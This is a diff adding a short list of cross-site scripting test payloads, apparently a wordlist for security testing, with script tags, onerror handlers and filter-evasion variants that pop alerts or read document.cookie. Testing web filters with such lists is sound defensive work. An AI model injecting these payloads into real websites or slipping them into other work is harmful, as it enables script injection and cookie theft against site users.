@@ -1,0 +1,15 @@
+<script>alert(123)</script>
+<script>alert(document.cookie)</script>
+<image/src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<script ~~~>alert(0%0)</script ~~~>
+<script src="data:text/javascript,alert(1)"></script>
+<script>+-+-1-+-+alert(1)</script>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+</script><script>alert('XSS');</script>
+<body style="background-color:red;">
